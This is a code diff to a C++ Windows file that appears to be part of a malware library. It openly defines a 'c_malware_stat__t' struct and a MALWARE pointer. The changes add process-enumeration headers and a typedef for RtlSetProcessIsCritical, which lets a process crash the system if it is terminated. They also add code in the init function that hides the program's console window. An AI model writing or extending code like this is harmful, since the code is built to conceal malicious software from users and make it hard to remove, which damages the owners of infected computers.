@@ -6,8 +6,14 @@
 #define TCP 4
 #define UDP 5
 
+#define FUNCTION int x, int xx
+#define KEEP_PID	0
 
-// Headers To Include 
+#define _CRT_SECURE_NO_WARNINGS
+#define _CRT_NONSTDC_NO_DEPRECATE
+#define WIN32_LEAN_AND_MEAN
+
+// Headers To Include
 #include <iostream>
 #include <cstdio>
 #include <cstring>
@@ -18,14 +24,24 @@
 
 #include <winsock2.h>
 #include <windows.h>
-
+#include <psapi.h>
+#include <Tlhelp32.h>
+#include <Windows.h>
+#pragma comment(lib, "shlwapi.lib")
 
 // Accessing Some Functions From Different Namespaces.
 using		std::string;
 using       	std::remove;
 
 // Custom Data Types And Typedefs
+
 typedef void (*function)(int, int);
+
+typedef long (WINAPI* RtlSetProcessIsCritical)(
+			IN  BOOLEAN	bNew,
+			OUT BOOLEAN*	pbOld,
+			IN  BOOLEAN	bNeedScb);
+
 
 struct c_malware_stat__t{
 	char	name[256];
@@ -43,6 +59,8 @@ struct c_malware_stat__t*	MALWARE;
 // Some Functions For Initializing The Library.
 void cvinit(int argc, char** argv){
 	HANDLE fh;
+	HWND wh;
+
 	_argv__=argv;
 	_argc__=argc;
 	MALWARE=&Current;
@@ -55,10 +73,12 @@ void cvinit(int argc, char** argv){
 
 	CloseHandle(fh);
 
+	AllocConsole();
+
+	wh=FindWindow("ConsoleWindowClass", NULL);
+	ShowWindow(wh, 0x00);
+
 	return;
-
-
-
 }
 
 void cvexit(int x){
